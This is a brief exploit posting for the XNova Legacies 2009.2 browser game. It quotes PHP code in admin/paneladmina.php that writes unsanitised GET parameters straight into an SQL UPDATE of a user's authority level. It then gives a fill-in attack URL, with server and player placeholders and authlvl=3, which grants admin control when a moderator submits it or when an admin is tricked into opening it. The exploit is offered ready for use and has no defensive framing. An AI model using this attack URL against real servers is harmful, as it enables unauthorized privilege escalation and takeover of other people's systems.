# Date: 27/1/2011
# Author: @xploitaday
# Software Homepage: http://www.xnova-ng.org/
# Software Link: http://downloads.tuxfamily.org/xnlegacies/releases/xnova-legacies_2009.2.tar.gz
# Version: 2009.2
 
Vuln file: admin/paneladmina.php
Vuln Lines:
108-117
                case &#039;usr_level&#039;:
                    $Player     = $_GET[&#039;player&#039;];
                    $NewLvl     = $_GET[&#039;authlvl&#039;];
 
                    $QryUpdate  = doquery("UPDATE {{table}} SET `authlevel` = &#039;".$NewLvl."&#039; WHERE `username` = &#039;".$Player."&#039;;", &#039;users&#039;);
                    $Message    = $lang[&#039;adm_mess_lvl1&#039;]. " ". $Player ." ".$lang[&#039;adm_mess_lvl2&#039;];
                    $Message   .= "<font color=\"red\">".$lang[&#039;adm_usr_level&#039;][ $NewLvl ]."</font>!";
 
                    AdminMessage ( $Message, $lang[&#039;adm_mod_level&#039;] );
                    break;
 
Description:
If you are a moderator, you can set you admin.
And if an admin visit this link, you be will granted with admin privileges (control of game)
 
Replace SERVER and PLAYER with yours
                     
Attack url: http://SERVER/admin/paneladmina.php?result=usr_level&player=PLAYER&authlvl=3



